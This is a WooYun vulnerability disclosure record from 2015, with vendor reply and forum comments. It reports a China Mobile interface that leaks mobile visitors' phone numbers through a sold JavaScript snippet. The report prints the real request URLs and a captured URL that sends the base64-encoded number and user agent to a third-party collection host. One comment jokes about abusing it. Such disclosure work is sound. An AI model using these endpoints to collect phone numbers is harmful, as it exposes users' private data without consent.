{"id": 46329, "wybug_id": "wooyun-2015-090703", "wybug_title": "中国移动某接口泄漏可导致访问网站就获取用户手机号（已经发现网站利用案例）", "wybug_corp": "中国移动", "wybug_author": "路人甲", "wybug_date": "2015-01-13 11:51", "wybug_open_date": "2015-02-27 11:52", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向公众公开  简要描述： 手机网站加载一段js代码后，即可获取到访问者的移动手机号码，获取率很高，通过分析，是移动研究院那边的泄露漏洞！ 详细说明：  有商家在出售获取手机号：http://112.124.4.229:808/member/my.php?mid=21&status=4手机网站加载一段他们提供的js代码后，即可获取到访问者的移动手机号码，获取率很高，通过分析，是移动研究院那边的泄露漏洞！通过抓包分析可以发现：注：抓包要用谷歌浏览器伪装成手机访问，不然抓包不到，它们屏蔽了pc！当用户访问手机网站后，会加载一段js，js请求访问移动研究院的IP：http://218.206.176.104:8080/api/cc.jsp?cmsn=Mm1JeVFaZW9YUjZxVEhoVVc2WGZTUT09&q=http%3A%2F%2F121.40.123.23%2Frecv.php%3F_f%3D185659aff8c4e814a5d3537d9efb98bf_-_id%3Dwxkj_-_inx%3D0_-_ref%3Dhttp%25253A%25252F%25252Flocalhost.com%25252F1.php_-_query%3D%252526id%25253Dwxkj%252526c%25253D3_-corp%3D获取到手机号之后，会把手机号通过base64加密返回给 js请求的参数q的值，如上面的：http://121.40.123.23/recv.php?_f=185659aff8c4e814a5d3537d9efb98bf_-_id=wxkj_-_inx=0_-_ref=http%3A%2F%2Flocalhost.com%2F1.php_-_query=%26id%3Dwxkj%26c%3D3_-corp=bnVsbCxNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIDdfMCBsaWtlIE1hYyBPUyBY%20OyBlbi11cykgQXBwbGVXZWJLaXQvNTM3LjUxLjEgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9u%20LzcuMCBNb2JpbGUvMTFBNDY1IFNhZmFyaS85NTM3LjUz参数corp 的值就是手机信息base64位加密后的，解密后可以发现内容为：null,Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53如果是手机访问网站的话， null 就会是你的手机号，我电脑访问的，所以没手机号   漏洞证明：  获取手机号的接口IP：218.206.176.104:8080 是移动研究院的IP\n\n获取的效果：\n\n让某小伙伴测试 获取跳转后的url\nhttp://121.40.123.23/recv.php?_f=185659aff8c4e814a5d3537d9efb98bf_-_id=wxkj_-_inx=0_-_ref=http%3A%2F%2Flocalhost.com%2F1.php_-_query=%26id%3Dwxkj%26c%3D3_-corp=ODYx*zYw*TE0ODA0*CxNb3ppbGxhLzUu*CAoTGludXg7IFU7IEFuZHJvaWQgNC4yLjI7IHpoLWNu%20OyBHVC1ONzEwOEQgQnVpbGQvSkRR*zkpIEFwcGxlV2ViS2l0LzUz*y4xIChLSFRNTCwgbGlrZSBH%20ZWNrbylWZXJzaW9uLzQu*CBNUVFCc*93c2VyLzUuNSBNb2JpbGUgU2F*YXJpLzUz*y4xIFYxX0FO%20RF9TUV81Lj*u*V8xOTZfWVlCX0QgUVEvNS4zLjEu*j*zNSBOZXRUeXBlLzRH\ncorp=后面的 url解码之后 base64解码 最后结果为\n86136*******0,Mozilla/5.0 (Linux; U; Android 4.2.2; zh-cn; GT-N7108D Build/JDQ39) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.5 Mobile Safari/533.1 V1_AND_SQ_5.3.1_196_YYB_D QQ/5.3.1.2335 NetType/4G\n   修复方案：  封掉即可！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-01-16 16:48 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向中国移动集团公司通报，由其后续尝试协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-13 11:55 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  我擦，移动也出现了。。。    \n     2015-01-13 12:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这要是挂在1024上不知道有多爽啊    \n     2015-01-13 12:13 |    \t\t追寻 \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:18        | 闭关修炼)\t\t \n  卧槽   坐个沙发    \n     2015-01-13 12:28 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  @xsser 吊吊的。。    \n     2015-01-13 12:30 |    \t\t奔跑的大饼 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  获取在线qq访客的程序 网上一大把  估计跟这个原理一样吧  手机访问网站 获取他的手机卡号··源头应该是sim的信息暴露吧    \n     2015-01-13 12:42 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  卧槽    \n     2015-01-13 14:08 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  赶紧去找找电信研究院的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}